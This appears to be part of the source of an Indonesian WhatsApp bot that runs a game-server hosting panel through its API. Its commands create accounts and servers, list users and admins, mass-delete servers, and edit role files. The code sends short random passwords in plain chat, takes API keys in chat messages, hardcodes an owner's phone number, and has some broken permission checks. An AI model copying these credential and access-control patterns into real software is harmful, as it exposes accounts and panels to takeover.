    const cpu = "0"; // CPU dalam %
    const disk = "6024"; // Disk dalam MB

    try {
        // Buat akun pengguna di sistem
        const createUserResponse = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                email: email,
                username: username,
                first_name: username,
                last_name: username,
                language: "en",
                password: password,
            }),
        });

        const userData = await createUserResponse.json();
        if (userData.errors) {
            reply(`Gagal membuat pengguna. Detail error:\n${JSON.stringify(userData.errors[0], null, 2)}`);
            return;
        }

        const user = userData.attributes;

        // Kirim pesan ke admin baru
        await Izz.sendMessage(userIdAdmin, {
            text: `*DETAIL AKUN ANDA*\n\n👤USERNAME: ${username}\n🔐PASSWORD: ${password}\n🌐LOGIN: ${domain}\n\nNOTE:\n1. Simpan data akun ini dengan baik.\n2. Jangan share data akun kepada siapa pun.`,
        });

        // Ambil informasi startup untuk server
        const eggResponse = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        const eggData = await eggResponse.json();
        const startupCmd = eggData.attributes.startup;

        // Buat server baru untuk pengguna
        const createServerResponse = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                name: name,
                description: " ",
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start",
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk,
                    io: 500,
                    cpu: cpu,
                },
                feature_limits: {
                    databases: 5,
                    backups: 5,
                    allocations: 1,
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: [],
                },
            }),
        });

        const serverData = await createServerResponse.json();
        if (serverData.errors) {
            reply(`Gagal membuat server. Detail error:\n${JSON.stringify(serverData.errors[0], null, 2)}`);
            return;
        }

        const server = serverData.attributes;

        // Konfirmasi sukses
        reply(`*SUCCESSFULLY ADD USER + SERVER*\n\n👤USERNAME: ${user.username}\n🖥️MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB\n💾DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB\n⚙️CPU: ${server.limits.cpu}%`);
    } catch (error) {
        reply("Terjadi kesalahan saat membuat akun atau server. Silakan coba lagi.");
        console.error(error);
    }
}
break
case "7gb": {
    

    // Pastikan hanya owner, premium, atau asisten yang bisa menjalankan
    if (!isOwner && !isPremium && !isAsisten) {
        reply(`Perintah ini hanya untuk owner, premium, atau asisten.`);
        return;
    }

    // Ambil argumen dari input
    const argsSplit = q.split(",");
    const username = argsSplit[0]?.trim(); // Nama pengguna baru
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Nomor dari mention atau balasan
    let nomor = quotedOrTagged ? quotedOrTagged.split('@')[0] : null; // Nomor dari mention atau balasan
    let serverChoice = argsSplit[2]?.trim().toLowerCase(); // Server ID dari argumen ketiga

    // Validasi nomor
    if (!nomor) {
        if (argsSplit.length >= 2 && /^\d{4,}$/.test(argsSplit[1])) {
            // Nomor diambil dari argumen kedua jika valid
            nomor = argsSplit[1].trim();
        } else {
            // Jika tidak ada, default ke nomor pengirim
            nomor = m.sender.split('@')[0];
        }
    }

    // Validasi serverChoice
    if (!serverChoice && argsSplit.length >= 2) {
        // Jika hanya ada dua argumen, serverChoice diambil dari argumen kedua
        serverChoice = argsSplit[1].trim().toLowerCase();
    }

    if (!username || !serverChoice) {
        reply(`Format salah! Gunakan format:\n1. Balas pesan dengan ${prefix + command} username,id_server\n2. Ketik ${prefix + command} username,@orang,id_server`);
        return;
    }

    // Tentukan domain dan apikey berdasarkan ID server
    let serverConfig;
    if (["1", "satu"].includes(serverChoice)) {
        if (!isOwner && !isAsisten && !isPremium) return reply(`Only owner dan asisten untuk ID server 1`);
        serverConfig = { domain: global.domain, apikey: global.apikey };
    } else if (["2", "dua"].includes(serverChoice)) {
        if (!isOwner && !isPremium) return reply(`Only owner dan premium untuk ID server 2`);
        serverConfig = { domain: global.domain2, apikey: global.apikey2 };
    } else if (["3", "prib"].includes(serverChoice)) {
        if (!isOwner) return reply(`Only owner untuk ID server prib`);
        serverConfig = { domain: global.domain3, apikey: global.apikey3 };
    } else {
        reply(`Server tidak valid. Gunakan '1', '2', atau 'prib'.`);
        return;
    }

    const { domain, apikey } = serverConfig;
    const userIdAdmin = `${nomor}@s.whatsapp.net`; // Format nomor untuk ID WhatsApp
    const password = generateRandomPassword(6); // Fungsi untuk membuat password acak

    const name = username + "7GB";
    const email = `${username}1398@gmail.com`;
    const egg = global.eggsnya;
    const loc = global.location;
    const memo = "7024"; // Memory dalam MB
    const cpu = "0"; // CPU dalam %
    const disk = "7024"; // Disk dalam MB

    try {
        // Buat akun pengguna di sistem
        const createUserResponse = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                email: email,
                username: username,
                first_name: username,
                last_name: username,
                language: "en",
                password: password,
            }),
        });

        const userData = await createUserResponse.json();
        if (userData.errors) {
            reply(`Gagal membuat pengguna. Detail error:\n${JSON.stringify(userData.errors[0], null, 2)}`);
            return;
        }

        const user = userData.attributes;

        // Kirim pesan ke admin baru
        await Izz.sendMessage(userIdAdmin, {
            text: `*DETAIL AKUN ANDA*\n\n👤USERNAME: ${username}\n🔐PASSWORD: ${password}\n🌐LOGIN: ${domain}\n\nNOTE:\n1. Simpan data akun ini dengan baik.\n2. Jangan share data akun kepada siapa pun.`,
        });

        // Ambil informasi startup untuk server
        const eggResponse = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        const eggData = await eggResponse.json();
        const startupCmd = eggData.attributes.startup;

        // Buat server baru untuk pengguna
        const createServerResponse = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                name: name,
                description: " ",
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start",
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk,
                    io: 500,
                    cpu: cpu,
                },
                feature_limits: {
                    databases: 5,
                    backups: 5,
                    allocations: 1,
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: [],
                },
            }),
        });

        const serverData = await createServerResponse.json();
        if (serverData.errors) {
            reply(`Gagal membuat server. Detail error:\n${JSON.stringify(serverData.errors[0], null, 2)}`);
            return;
        }

        const server = serverData.attributes;

        // Konfirmasi sukses
        reply(`*SUCCESSFULLY ADD USER + SERVER*\n\n👤USERNAME: ${user.username}\n🖥️MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB\n💾DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB\n⚙️CPU: ${server.limits.cpu}%`);
    } catch (error) {
        reply("Terjadi kesalahan saat membuat akun atau server. Silakan coba lagi.");
        console.error(error);
    }
}
break
                case "listsrv": case "s": {
                const allowedPath = './save/database/allowed.json';

    // Cek apakah file allowed.json ada
    if (!fs.existsSync(allowedPath)) {
        reply(`Database pengguna (allowed.json) tidak ditemukan.`);
        return;
    }

    // Load isi database
    const allowed = JSON.parse(fs.readFileSync(allowedPath));

    // Ambil ID pengguna
    const userId = m.sender.split('@')[0]; // ID pengguna (nomor telepon)

    // Periksa apakah ID pengguna ada di database
    if (!allowed.includes(userId)) {
        reply(`anda tidak termasuk ke database silahkan beli ke owner`);
        return;
    }
if (!isOwner) return (`only owner`)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Berikut list server nya:\n\n";
for (let server of servers) {
let s = server.attributes; 
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `ID server: ${s.id}\n`;
messageText += `Nama server: ${s.name}\n`;
messageText += `Status: ${status}\n\n`;
}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total server: ${res.meta.pagination.count}`;
await Izz.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break
case 'clearpanel': {
const allowedPath = './save/database/allowed.json';

    // Cek apakah file allowed.json ada
    if (!fs.existsSync(allowedPath)) {
        reply(`Database pengguna (allowed.json) tidak ditemukan.`);
        return;
    }

    // Load isi database
    const allowed = JSON.parse(fs.readFileSync(allowedPath));

    // Ambil ID pengguna
    const userId = m.sender.split('@')[0]; // ID pengguna (nomor telepon)

    // Periksa apakah ID pengguna ada di database
    if (!allowed.includes(userId)) {
        reply(`anda tidak termasuk ke database silahkan beli ke owner`);
        return;
    }
  // Mengecek apakah perintah dijalankan oleh owner
  if (!isOwner) return reply(`Khusus owner`);
  
  // Memisahkan teks input menjadi array berdasarkan koma
  let t = text.split(',');
  if (t.length < 2) {
    return reply(`*Format salah*\nPenggunaan: ${prefix + command} id1,id2`);
  }

  // Mengonversi input ke tipe number
  let aku = Number(t[0]);
  let aku1 = Number(t[1]);

  let tokenptla = `${apikey}`;
  let domainpnl = `${domain}`;

  reply('BERSIH BERSIH PANEL TELAH DI MULAI BOSKU');

  // Fungsi untuk menghapus semua server kecuali yang dikecualikan
  async function deleteAllServers() {
    let currentPage = 1;
    let totalPages;

    do {
      // Mengambil daftar server
      let response = await fetch(`${domainpnl}/api/application/servers?page=${currentPage}`, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${tokenptla}`
        }
      });

      if (!response.ok) {
        reply(`Gagal mendapatkan data server: ${response.statusText}`);
        console.log(await response.text());
        return;
      }

      let result = await response.json();

      // Memastikan data pagination ada
      if (result.meta && result.meta.pagination) {
        totalPages = result.meta.pagination.total_pages;
      } else {
        reply(`Gagal mendapatkan data pagination.`);
        return;
      }

      // Loop melalui setiap server
      for (let server of result.data) {
        let serverId = server.attributes.id;

        // Mengecualikan server dengan ID yang sesuai
        if (serverId === aku || serverId === aku1) {
          console.log(`Melewatkan server dengan ID ${serverId}`);
          continue; 
          reply(`MELEWATKAN ID ${aku} dan id2 ${aku1} `);
          // Lanjutkan ke iterasi berikutnya
        }

        // Menghapus server jika tidak dikecualikan
        let deleteResponse = await fetch(`${domainpnl}/api/application/servers/${serverId}`, {
          method: 'DELETE',
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${tokenptla}`
          }
        });

        if (!deleteResponse.ok) {
          let errorResult = await deleteResponse.json();
          reply(`Gagal menghapus server dengan ID ${serverId}: ${errorResult.errors}`);
        } else {
          console.log(`Berhasil menghapus server dengan ID ${serverId}`);
        }
      }

      currentPage++;
    } while (currentPage <= totalPages);
  }

  // Memanggil fungsi untuk menghapus semua server
  await deleteAllServers();
  reply('PROSES DELL ALL PANEL TELAH SELESAI.');
}
break

case 'listuser': {
if (!isOwner) return m.reply(`only Owner`);
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let users = res.data;
let messageText = "Berikut list user nya:\n\n";
for (let user of users) {
let u = user.attributes;
messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Tidak aktif' : 'Aktif'}\n`;
messageText += `${u.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total user: ${res.meta.pagination.count}`;
await Izz.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break
        case "delusr": {
        const allowedPath = './save/database/allowed.json';

    // Cek apakah file allowed.json ada
    if (!fs.existsSync(allowedPath)) {
        reply(`Database pengguna (allowed.json) tidak ditemukan.`);
        return;
    }

    // Load isi database
    const allowed = JSON.parse(fs.readFileSync(allowedPath));

    // Ambil ID pengguna
    const userId = m.sender.split('@')[0]; // ID pengguna (nomor telepon)

    // Periksa apakah ID pengguna ada di database
    if (!allowed.includes(userId)) {
        reply(`anda tidak termasuk ke database silahkan beli ke owner`);
        return;
    }
  if (!isOwner) return reply(`KHUSUS izz`);
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
} 
break

case 'listadmin': {
const allowedPath = './save/database/allowed.json';

    // Cek apakah file allowed.json ada
    if (!fs.existsSync(allowedPath)) {
        reply(`Database pengguna (allowed.json) tidak ditemukan.`);
        return;
    }

    // Load isi database
    const allowed = JSON.parse(fs.readFileSync(allowedPath));

    // Ambil ID pengguna
    const userId = m.sender.split('@')[0]; // ID pengguna (nomor telepon)

    // Periksa apakah ID pengguna ada di database
    if (!allowed.includes(userId)) {
        reply(`anda tidak termasuk ke database silahkan beli ke owner`);
        return;
    }
if (!isOwner) return ('KHUSUS OWNER') 
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}});
let tks = `SEDANG MEMPROSES`
    const bokep = {

        text: tks,

    }

	

    await Izz.sendMessage(m.chat, bokep)
let res = await f.json();
let users = res.data;
let messageText = "Berikut List Admin:\n\n";
for (let user of users) {
let u = user.attributes;
if (u.root_admin) {
messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
messageText += `${u.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total: ${res.meta.pagination.count}`;
await Izz.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
await Izz.sendMessage(m.chat, {

        text: `SUKSES MENGIRIM ADP📦`,}) 


{console.log(chalk.red.italic('proses berhasil'))}
}
break
case "addprem": {
    

    // Pastikan hanya owner yang bisa menjalankan perintah
    if (!isOwner) return reply(`Hanya owner yang dapat menambahkan pengguna ke premium.`);

    // Ambil nomor dari reply, tag, atau argumen langsung
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Ambil dari reply/tag
    const userNumber = quotedOrTagged 
        ? quotedOrTagged.split('@')[0] 
        : q?.replace(/[^0-9]/g, ''); // Nomor dari argumen langsung

    if (!userNumber) {
        reply(`Silakan reply pesan, tag pengguna, atau masukkan nomor untuk ditambahkan ke premium.\n\nContoh:\n1. Reply pesan pengguna dengan command ini.\n2. ${prefix}addprem 6281234567890`);
        return;
    }

    const userId = `${userNumber}@s.whatsapp.net`;

    // Cek apakah nomor valid dan terdaftar di WhatsApp
    const userCheck = await Izz.onWhatsApp(userNumber);
    if (userCheck.length === 0) {
        reply(`Nomor ${userNumber} tidak valid atau tidak terdaftar di WhatsApp.`);
        return;
    }

    // Tambahkan ke status premium
    const premiumPath = './save/database/premium.json';
    let premiumList = [];
    if (fs.existsSync(premiumPath)) {
        premiumList = JSON.parse(fs.readFileSync(premiumPath));
    }

    if (!premiumList.includes(userId)) {
        premiumList.push(userId);
        fs.writeFileSync(premiumPath, JSON.stringify(premiumList, null, 2));
    }

    // Perbarui file allowed.json
    const allowedPath = './save/database/allowed.json';
    let allowedList = [];
    if (fs.existsSync(allowedPath)) {
        allowedList = JSON.parse(fs.readFileSync(allowedPath));
    }

    if (!allowedList.includes(userNumber)) {
        allowedList.push(userNumber);
        fs.writeFileSync(allowedPath, JSON.stringify(allowedList, null, 2));
    }

    // Konfirmasi ke owner dan pengguna
    reply(`Nomor ${userNumber} berhasil ditambahkan ke premium dan database.`);
    await Izz.sendMessage(userId, {
        text: `Selamat! Anda telah ditambahkan sebagai pengguna premium.\nAnda juga terdaftar dalam database akses bot.\n\nJika ada masalah, hubungi owner: 6281274749995.`,
    });
}
break
case "delprem": {
    

    // Pastikan hanya owner yang bisa menjalankan perintah
    if (!isOwner) return reply(`Hanya owner yang dapat menghapus pengguna dari premium.`);

    // Ambil nomor dari reply, tag, atau argumen langsung
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Ambil dari reply/tag
    const userNumber = quotedOrTagged 
        ? quotedOrTagged.split('@')[0] 
        : q?.replace(/[^0-9]/g, ''); // Nomor dari argumen langsung

    if (!userNumber) {
        reply(`Silakan reply pesan, tag pengguna, atau masukkan nomor untuk dihapus dari premium.\n\nContoh:\n1. Reply pesan pengguna dengan command ini.\n2. ${prefix}delprem 6281234567890`);
        return;
    }

    const userId = `${userNumber}@s.whatsapp.net`;

    // Baca file premium.json
    const premiumPath = './save/database/premium.json';
    let premiumList = [];
    if (fs.existsSync(premiumPath)) {
        premiumList = JSON.parse(fs.readFileSync(premiumPath));
    }

    // Periksa apakah nomor ada di daftar premium
    if (!premiumList.includes(userId)) {
        reply(`Nomor ${userNumber} tidak ditemukan di daftar premium.`);
        return;
    }

    // Hapus nomor dari daftar
    premiumList = premiumList.filter(id => id !== userId);
    fs.writeFileSync(premiumPath, JSON.stringify(premiumList, null, 2));

    // Konfirmasi penghapusan
    reply(`Nomor ${userNumber} berhasil dihapus dari daftar premium.`);
}
break
case "addowner": {
    

    if (!isOwner) return reply(`Hanya owner utama yang dapat menambahkan owner baru.`);

    // Ambil nomor dari reply, tag, atau argumen
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Ambil dari reply/tag
    const newOwnerNumber = quotedOrTagged 
        ? quotedOrTagged.split('@')[0] 
        : q?.replace(/[^0-9]/g, ''); // Nomor dari argumen langsung

    if (!newOwnerNumber) {
        reply(`Silakan reply pesan atau masukkan nomor pengguna untuk dijadikan owner.\n\nContoh:\n1. Reply pesan pengguna dengan command ini.\n2. ${prefix}addowner 6281234567890`);
        return;
    }

    const newOwnerName = "Owner Baru"; // Nama default jika tidak disebutkan
    const userId = `${newOwnerNumber}@s.whatsapp.net`;

    // Validasi apakah nomor valid dan terdaftar di WhatsApp
    const userCheck = await Izz.onWhatsApp(newOwnerNumber);
    if (userCheck.length === 0) {
        reply(`Nomor ${newOwnerNumber} tidak valid atau tidak terdaftar di WhatsApp.`);
        return;
    }

    // Perbarui file owner.json
    const ownerPath = './save/database/owner.json';
    let ownerList = [];
    if (fs.existsSync(ownerPath)) {
        ownerList = JSON.parse(fs.readFileSync(ownerPath));
    }

    if (!ownerList.includes(newOwnerNumber)) {
        ownerList.push(newOwnerNumber);
        fs.writeFileSync(ownerPath, JSON.stringify(ownerList, null, 2));
    }

    // Perbarui file allowed.json
    const allowedPath = './save/database/allowed.json';
    let allowedList = [];
    if (fs.existsSync(allowedPath)) {
        allowedList = JSON.parse(fs.readFileSync(allowedPath));
    }

    if (!allowedList.includes(newOwnerNumber)) {
        allowedList.push(newOwnerNumber);
        fs.writeFileSync(allowedPath, JSON.stringify(allowedList, null, 2));
    }

    // Konfirmasi ke owner
    reply(`Nomor ${newOwnerNumber} berhasil ditambahkan sebagai owner.`);

    // Kirim pesan ke owner baru
    await Izz.sendMessage(userId, {
        text: `Selamat! Anda telah ditambahkan sebagai owner bot.\n\nNama Anda: ${newOwnerName}\n\nJika ada masalah, hubungi owner utama.`,
    });
}
break
case "delowner": {
    

    // Pastikan hanya owner utama yang bisa menjalankan perintah
    if (!isOwner) return reply(`Hanya owner utama yang dapat menghapus owner lain.`);

    // Ambil nomor dari reply, tag, atau argumen
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Ambil dari reply/tag
    const ownerNumber = quotedOrTagged 
        ? quotedOrTagged.split('@')[0] 
        : q?.replace(/[^0-9]/g, ''); // Nomor dari argumen langsung

    if (!ownerNumber) {
        reply(`Silakan reply pesan atau masukkan nomor pengguna untuk dihapus dari daftar owner.\n\nContoh:\n1. Reply pesan pengguna dengan command ini.\n2. ${prefix}delowner 6281234567890`);
        return;
    }

    // Proteksi nomor utama
    const mainOwner = "6281274749995";
    if (ownerNumber === mainOwner) {
        reply(`Nomor ${mainOwner} adalah nomor utama dan tidak dapat dihapus.`);
        return;
    }

    // Baca file owner.json
    const ownerPath = './save/database/owner.json';
    let ownerList = [];
    if (fs.existsSync(ownerPath)) {
        ownerList = JSON.parse(fs.readFileSync(ownerPath));
    }

    // Periksa apakah nomor ada di daftar owner
    if (!ownerList.includes(ownerNumber)) {
        reply(`Nomor ${ownerNumber} tidak ditemukan di daftar owner.`);
        return;
    }

    // Hapus nomor dari daftar
    ownerList = ownerList.filter(id => id !== ownerNumber);
    fs.writeFileSync(ownerPath, JSON.stringify(ownerList, null, 2));

    // Konfirmasi penghapusan
    reply(`Nomor ${ownerNumber} berhasil dihapus dari daftar owner.`);
}
break
case "addasisten": {
    

    // Pastikan hanya owner yang bisa menjalankan perintah
    if (!isOwner) return reply(`Hanya owner yang dapat menambahkan asisten.`);

    // Ambil nomor dan nama dari reply, tag, atau argumen langsung
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Ambil dari reply/tag
    const asistenNumber = quotedOrTagged 
        ? quotedOrTagged.split('@')[0] 
        : q?.split(',')[0]?.replace(/[^0-9]/g, ''); // Nomor dari argumen langsung

    if (!asistenNumber) {
        reply(`Silakan reply pesan, tag pengguna, atau masukkan nomor untuk dijadikan asisten.\n\nContoh:\n1. Reply pesan pengguna dengan command ini.\n2. ${prefix}addasisten 6281234567890,Nama Asisten`);
        return;
    }

    const asistenName = q?.split(',')[1]?.trim() || "Asisten Baru"; // Nama default jika tidak disebutkan
    const userId = `${asistenNumber}@s.whatsapp.net`;

    // Validasi apakah nomor valid dan terdaftar di WhatsApp
    const userCheck = await Izz.onWhatsApp(asistenNumber);
    if (userCheck.length === 0) {
        reply(`Nomor ${asistenNumber} tidak valid atau tidak terdaftar di WhatsApp.`);
        return;
    }

    // Perbarui file asisten.json
    const asistenPath = './save/database/asisten.json';
    let asistenList = [];
    if (fs.existsSync(asistenPath)) {
        asistenList = JSON.parse(fs.readFileSync(asistenPath));
    }

    if (!asistenList.includes(asistenNumber)) {
        asistenList.push(asistenNumber);
        fs.writeFileSync(asistenPath, JSON.stringify(asistenList, null, 2));
    }

    // Perbarui file allowed.json
    const allowedPath = './save/database/allowed.json';
    let allowedList = [];
    if (fs.existsSync(allowedPath)) {
        allowedList = JSON.parse(fs.readFileSync(allowedPath));
    }

    if (!allowedList.includes(asistenNumber)) {
        allowedList.push(asistenNumber);
        fs.writeFileSync(allowedPath, JSON.stringify(allowedList, null, 2));
    }

    // Konfirmasi ke owner
    reply(`Nomor ${asistenNumber} berhasil ditambahkan sebagai asisten.`);

    // Kirim pesan ke asisten baru
    await Izz.sendMessage(userId, {
        text: `Selamat! Anda telah ditambahkan sebagai asisten bot.\n\nNama Anda: ${asistenName}\n\nJika ada masalah, hubungi owner.`,
    });
}
break
case "delasisten": {
    

    // Pastikan hanya owner yang bisa menjalankan perintah
    if (!isOwner) return reply(`Hanya owner yang dapat menghapus asisten.`);

    // Ambil nomor dari reply, tag, atau argumen langsung
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Ambil dari reply/tag
    const asistenNumber = quotedOrTagged 
        ? quotedOrTagged.split('@')[0] 
        : q?.replace(/[^0-9]/g, ''); // Nomor dari argumen langsung

    if (!asistenNumber) {
        reply(`Silakan reply pesan, tag pengguna, atau masukkan nomor untuk dihapus dari daftar asisten.\n\nContoh:\n1. Reply pesan pengguna dengan command ini.\n2. ${prefix}delasisten 6281234567890`);
        return;
    }

    // Baca file asisten.json
    const asistenPath = './save/database/asisten.json';
    let asistenList = [];
    if (fs.existsSync(asistenPath)) {
        asistenList = JSON.parse(fs.readFileSync(asistenPath));
    }

    // Periksa apakah nomor ada di daftar asisten
    if (!asistenList.includes(asistenNumber)) {
        reply(`Nomor ${asistenNumber} tidak ditemukan di daftar asisten.`);
        return;
    }

    // Hapus nomor dari daftar
    asistenList = asistenList.filter(id => id !== asistenNumber);
    fs.writeFileSync(asistenPath, JSON.stringify(asistenList, null, 2));

    // Konfirmasi penghapusan
    reply(`Nomor ${asistenNumber} berhasil dihapus dari daftar asisten.`);
}
break
case 'resetakses': {
const allowedPath = './save/database/allowed.json';

    // Cek apakah file allowed.json ada
    if (!fs.existsSync(allowedPath)) {
        reply(`Database pengguna (allowed.json) tidak ditemukan.`);
        return;
    }

    // Load isi database
    const allowed = JSON.parse(fs.readFileSync(allowedPath));

    // Ambil ID pengguna
    const userId = m.sender.split('@')[0]; // ID pengguna (nomor telepon)

    // Periksa apakah ID pengguna ada di database
    if (!allowed.includes(userId)) {
        reply(`anda tidak termasuk ke database silahkan beli ke owner`);
        return;
    }
    if (!isOwner) return reply('❌ *Khusus owner*');

    const roles = ['owner', 'asisten', 'prem']; // Daftar role
    const allowedFilePath = './save/database/allowed.json';
    const excludedNumber = '6281274749995';

    try {
        // Reset setiap role: owner, asisten, prem
        for (let role of roles) {
            let filePath;

            // Tentukan path file berdasarkan role
            if (role === 'owner') filePath = './save/database/owner.json';
            else if (role === 'asisten') filePath = './save/database/asisten.json';
            else if (role === 'prem') filePath = './save/database/premium.json';

            // Jika file adalah owner.json, sisakan excludedNumber
            if (role === 'owner') {
                fs.writeFileSync(filePath, JSON.stringify([excludedNumber], null, 2));
            } else {
                // Kosongkan file untuk role lainnya
                fs.writeFileSync(filePath, JSON.stringify([], null, 2));
            }
        }

        // Hapus akses dari file allowed.json
        if (fs.existsSync(allowedFilePath)) {
            const allowedNumbers = JSON.parse(fs.readFileSync(allowedFilePath));

            // Filter nomor, menyisakan hanya excludedNumber
            const updatedAllowed = allowedNumbers.filter(num => num.includes(excludedNumber));
            fs.writeFileSync(allowedFilePath, JSON.stringify(updatedAllowed, null, 2));
        }

        reply('✅ Semua akses berhasil direset. Nomor 6281274749995 tetap dipertahankan di owner.json.');
    } catch (error) {
        console.error('Error saat mereset akses:', error.message);
        reply('❌ Terjadi kesalahan saat mereset akses.');
    }
}
break
case 'updomain': {
    const allowedPath = './save/database/allowed.json';

    // Cek apakah file allowed.json ada
    if (!fs.existsSync(allowedPath)) {
        reply(`Database pengguna (allowed.json) tidak ditemukan.`);
        return;
    }

    // Load isi database
    const allowed = JSON.parse(fs.readFileSync(allowedPath));

    // Ambil ID pengguna
    const userId = m.sender.split('@')[0]; // ID pengguna (nomor telepon)

    // Periksa apakah ID pengguna ada di database
    if (!allowed.includes(userId)) {
        reply(`Anda tidak termasuk ke database. Silakan beli akses ke owner.`);
        return;
    }
if (!isOwner) return m.reply(`khusus owner`)
    // Validasi input
    if (!text) {
        return reply(`*Format salah!*\n\nContoh:\n.updomain 1,https://example.com,apikey1,capikey1\n.updomain 2,https://example2.com,apikey2,capikey2\n.updomain 3,https://example3.com,apikey3,capikey3`);
    }

    const args = text.split(',');
    if (args.length !== 4) {
        return reply(`*Format salah!*\n\nContoh:\n.updomain 1,https://example.com,apikey1,capikey1\n.updomain 2,https://example2.com,apikey2,capikey2\n.updomain 3,https://example3.com,apikey3,capikey3`);
    }

    const domainNumber = args[0].trim();
    const newDomain = args[1].trim();
    const newApiKey = args[2].trim();
    const newCaPiKey = args[3].trim();

    // Validasi nomor domain
    if (!['1', '2', '3'].includes(domainNumber)) {
        return reply(`*Nomor domain tidak valid!*\nGunakan nomor 1, 2, atau 3.`);
    }

    // Update domain, apikey, dan capikey global sesuai dengan nomor
    switch (domainNumber) {
        case '1':
            global.domain = newDomain;
            global.apikey = newApiKey;
            global.capikey = newCaPiKey;
            break;
        case '2':
            global.domain2 = newDomain;
            global.apikey2 = newApiKey;
            global.capikey2 = newCaPiKey;
            break;
        case '3':
            global.domain3 = newDomain;
            global.apikey3 = newApiKey;
            global.capikey3 = newCaPiKey;
            break;
    }

    reply(`_Berhasil mengganti pengaturan untuk domain,apikey dan capikey_`);
}
break
case 'upowner': {
const NomerOwnBot = '6281274749995@s.whatsapp.net';
